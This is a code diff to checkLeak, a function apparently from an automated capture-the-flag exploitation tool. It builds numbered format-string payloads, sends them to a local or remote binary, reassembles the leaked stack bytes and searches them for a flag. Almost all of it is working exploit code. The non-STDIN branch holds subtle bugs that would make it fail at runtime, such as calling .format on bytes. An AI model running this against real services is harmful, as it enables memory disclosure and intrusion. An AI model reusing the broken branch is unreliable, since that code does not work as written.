@@ -7,12 +7,17 @@ def checkLeak(
     binary_name, properties, remote_server=False, remote_url="", port_num=1337
 ):
 
-    full_string = ""
+    full_string = b""
     run_count = 50
 
     # Should have plenty of _%x_ in string
     base_input_string = properties["pwn_type"]["input"]
-    format_count = base_input_string.count("_%x")
+
+    format_specifier = b"lx"
+    if "amd64" in properties["protections"]["arch"]:
+        format_specifier = b"llx"
+
+    format_count = base_input_string.count(b"_%" + format_specifier)
 
     if properties["input_type"] == "STDIN" or properties["input_type"] == "LIBPWNABLE":
         for i in range(int(run_count / format_count) + 1):
@@ -28,14 +33,15 @@ def checkLeak(
             # Swap in values for every _%x
             for j in range(format_count):
                 iter_num = (i * format_count) + j
+                iter_byte = str(iter_num).encode()
                 input_string = input_string.replace(
-                    "_%x", "_%{}$08x".format(iter_num), 1
+                    b"_%" + format_specifier, b"_%" + iter_byte + b"$" + format_specifier, 1
                 )
 
-            # print("[+] Sending input {}".format(input_string))
+            print("[+] Sending input {}".format(input_string))
             proc.sendline(input_string)
 
-            results = proc.recvall(timeout=5).decode("utf-8")
+            results = proc.recvall(timeout=5)
 
             """
             1. Split data by '_'
@@ -43,35 +49,35 @@ def checkLeak(
             3. flip bytes for endianess
             4. hex to ascii converstion
             """
-            data_leaks = results.split("_")
+            data_leaks = results.split(b"_")
+            # data_leaks = [
+            #     x[0:8] if all([y in string.hexdigits.encode() for y in x]) else b""
+            #     for x in data_leaks
+            # ]
+            # Swap endianess
             data_leaks = [
-                x[0:8] if all([y in string.hexdigits for y in x]) else ""
-                for x in data_leaks
-            ]
-            data_leaks = [
-                "".join([y[x : x + 2] for x in range(0, len(y), 2)][::-1])
+                b"".join([y[x : x + 2] for x in range(0, len(y), 2)][::-1])
                 for y in data_leaks
             ]
             try:
                 data_copy = data_leaks
-                data_leaks = [binascii.unhexlify(x) for x in data_leaks]
-            except TypeError as e:
+                data_leaks = [binascii.unhexlify(x.decode()) for x in data_leaks]
+            except binascii.Error:
                 print("[~] Odd length string detected... Skipping")
                 temp_data = []
                 for x in data_copy:
                     try:
-                        temp_data.append(binascii.unhexlify(str(x)))
+                        temp_data.append(binascii.unhexlify(x.decode()))
                     except:
-                        pass
-                        # print("[+] Bad chunk {}".format(x))
+                        # pass
+                        print("[+] Bad chunk {}".format(x))
 
                 data_leaks = temp_data
-
-            data_leaks = [x.decode("utf-8", "ignore") for x in data_leaks]
-            full_string += "".join(data_leaks)
+            print(data_leaks)
+            full_string += b''.join(data_leaks)
 
         # Only return printable ASCII
-        full_string = "".join([x if x in string.printable else "" for x in full_string])
+        full_string = b"".join([x.to_bytes(1,'little') if x.to_bytes(1,'little') in string.printable.encode() else b"" for x in full_string])
     else:
         for i in range((run_count / format_count) + 1):
 
@@ -81,7 +87,7 @@ def checkLeak(
             for j in range(format_count):
                 iter_num = (i * format_count) + j
                 input_string = input_string.replace(
-                    "_%x", "_%{}$08x".format(iter_num), 1
+                    b"_%x", b"_%{}$".format(iter_num) + format_specifier, 1
                 ).rstrip("\x00")
 
             # Create local or remote process
@@ -98,27 +104,27 @@ def checkLeak(
             3. flip bytes for endianess
             4. hex to ascii converstion
             """
-            data_leaks = results.split("_")
+            data_leaks = results.split(b"_")
             data_leaks = [
-                x[0:8] if all([y in string.hexdigits for y in x]) else ""
+                x[0:8] if all([y in string.hexdigits for y in x]) else b""
                 for x in data_leaks
             ]
             data_leaks = [
-                "".join([y[x : x + 2] for x in range(0, len(y), 2)][::-1])
+                b"".join([y[x : x + 2] for x in range(0, len(y), 2)][::-1])
                 for y in data_leaks
             ]
             data_leaks = [binascii.unhexlify(x) for x in data_leaks]
 
-            full_string += "".join(data_leaks)
+            full_string += b"".join(data_leaks)
 
         # Only return printable ASCII
-        full_string = "".join([x if x in string.printable else "" for x in full_string])
+        full_string = b"".join([x if x in string.printable else b"" for x in full_string])
 
     leakProperties = {}
     leakProperties["flag_found"] = False
 
     # Dumb check for finding flag
-    if "{" in full_string and "}" in full_string:
+    if b"{" in full_string and b"}" in full_string:
         print("[+] Flag found:")
         leakProperties["flag_found"] = True
 
